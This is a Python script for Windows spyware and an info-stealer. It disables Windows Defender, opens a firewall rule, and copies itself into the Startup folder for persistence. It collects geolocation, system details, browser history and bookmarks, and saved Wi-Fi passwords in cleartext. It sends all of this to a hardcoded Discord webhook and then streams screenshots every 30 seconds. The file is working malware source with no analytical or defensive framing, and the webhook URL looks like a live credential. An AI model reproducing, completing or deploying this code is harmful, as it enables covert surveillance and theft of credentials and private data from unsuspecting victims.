import os
os.system('pip install discord asyncio pyautogui browser_history winshell socket aiohttp')
import discord, asyncio, json, urllib.request, pyautogui, pathlib, aiohttp, time, platform, browser_history, winreg, winshell, socket
os.system(f'netsh advfirewall firewall add rule name="Allow MV2" dir=in action=allow program="{os.getcwd()}\\MonV2.exe"')
os.system('sc stop WinDefend')
os.system(f'xcopy "{os.getcwd()}\\MonV2.exe" "{winshell.startup}\\MonV2.exe" \c \q')
async def on_ready(url):
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(url, session=session)
        try:
            geturl = 'http://ipinfo.io/json'
            response = urllib.request.urlopen(geturl)
            data = json.load(response)
            IPd = data['ip']
            org = data['org']
            city = data['city']
            country = data['country']
            region = data['region']
            timezone = data['timezone']
            location = data['loc']
            try: machinename = platform.uname().node
            except: machinename = 'Unavailable'
            try: osver = f'{platform.uname().system} version {platform.uname().version}'
            except: osver = 'Unavailable'
            try: platformm = platform.uname().machine
            except: platformm = 'Unavailable'
            try: processor = os.popen('wmic cpu get name').read().splitlines()[2]
            except: processor = 'Unavailable'
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice') as regkey:
                default_browser = winreg.QueryValueEx(regkey, 'ProgId')[0]
            h = browser_history.get_history().histories
            b = browser_history.get_bookmarks().bookmarks
            with open('History', 'w', encoding='UTF-8') as history:
                for i in range(len(h)):
                    history.write(
                        f'Time: {h[i][0]}, Name: {h[i][2]}, Url: {h[i][1]}\n')
                history.close()
            with open('Bookmarks', 'w', encoding='UTF-8') as bookmark:
                for z in range(len(b)):
                    bookmark.write(
                        f'Time: {b[z][0]}, Name: {h[z][2]}, Url: {h[z][1]}\n')
                bookmark.close()
            p1 = os.popen('netsh wlan show profile').read().splitlines()
            p2 = []
            network_names = []
            tid = 0
            for s in p1:
                if s.strip():
                    p2.append(s)
            del p2[0:p2.index('User profiles')+2]
            for z in p2:
                network_names.append(z.replace('    All User Profile     : ', ''))
            p3 = os.popen(f'netsh wlan show profile name="{network_names[0]}" key=clear').read().splitlines()
            for y in range(len(p3)):
                if p3[y].find('    Key Content            : ') != -1:
                    tid = y
            p3 = p3[tid].replace('    Key Content            : ', '')
            with open('Networks', 'w') as n:
                for g in range(len(network_names)):
                    try:
                        p3 = os.popen(f'netsh wlan show profile name="{network_names[g]}" key=clear').read().splitlines()
                        for y in range(len(p3)):
                            if p3[y].find('    Key Content            : ') != -1:
                                tid = y
                        p3 = p3[tid].replace('    Key Content            : ', '')
                        n.write(f'{network_names[g]}: {p3}\n')
                    except: pass
                n.close()
        except:
            IPd = 'Unavailable'
            org = 'Unavailable'
            city = 'Unavailable'
            country = 'Unavailable'
            region = 'Unavailable'
            timezone = 'Unavailable'
            location = 'Unavailable'
        os.system('sc start WinDefend')
        embed = discord.Embed(title='New machine connected')
        embed.add_field(name=f'net_IP: {IPd}', value='')
        embed.add_field(name=f'net_org: {org}', value='')
        embed.add_field(name=f'net_city: {city}', value='')
        embed.add_field(name=f'net_country: {country}', value='')
        embed.add_field(name=f'net_reg: {region}', value='')
        embed.add_field(name=f'net_tz: {timezone}', value='')
        embed.add_field(name=f'net_loc: {location}', value='')
        embed.add_field(name=f'local_hostname: {machinename}', value='')
        embed.add_field(name=f'local_IP: {socket.gethostbyname(socket.gethostname())}', value='')
        embed.add_field(name=f'local_OS: {osver}', value='')
        embed.add_field(name=f'local_platform: {platformm}', value='')
        embed.add_field(name=f'local_processor: {processor}', value='')
        embed.add_field(name='screen', value='Updating...')
        embedID = await webhook.send(embed=embed, wait=True)
        await webhook.send('browser_history: ', file=discord.File('History'))
        await webhook.send('browser_bookmarks: ', file=discord.File('Bookmarks'))
        await webhook.send('networks: ', file=discord.File('Networks'))
        os.remove('History')
        os.remove('Bookmarks')
        for z in range(69420):
            try:
                pyautogui.screenshot('photo.png')
                sfile = discord.File(
                    f'{pathlib.Path.cwd()}\photo.png', filename='photo.png')
                embedEdit = discord.Embed(title='Monitor')
                embedEdit.add_field(name=f'net_IP: {IPd}', value='')
                embedEdit.add_field(name=f'net_org: {org}', value='')
                embedEdit.add_field(name=f'net_city: {city}', value='')
                embedEdit.add_field(name=f'net_country: {country}', value='')
                embedEdit.add_field(name=f'net_reg: {region}', value='')
                embedEdit.add_field(name=f'net_tz: {timezone}', value='')
                embedEdit.add_field(name=f'net_loc: {location}', value='')
                embedEdit.add_field(name=f'local_hostname: {machinename}', value='')
                embedEdit.add_field(name=f'local_IP: {socket.gethostbyname(socket.gethostname())}', value='')
                embedEdit.add_field(name=f'local_OS: {osver}', value='')
                embedEdit.add_field(name=f'local_platform: {platformm}', value='')
                embedEdit.add_field(name=f'local_processor: {processor}', value='')
                embedEdit.add_field(name='screen:', value='(updates every 30s)')
                embedEdit.set_image(url='attachment://ssphoto.png')
                await embedID.edit(embed=embedEdit, attachments=[sfile])
                os.remove(f'{pathlib.Path.cwd()}\ssphoto.png')
                os.remove('ssphoto.png')
            except: pass
            time.sleep(30)
if __name__ == '__main__':
    loop = asyncio.new_event_loop()
    loop.run_until_complete(on_ready('https://discord.com/api/webhooks/1275408734621007892/56juwjJiWOW1x80WUx7SU7-QXy-FvIXgEBiF6Kl2kidLhGkFQRXBJXNrwZ3cSbUFhNuK'))
    loop.close()
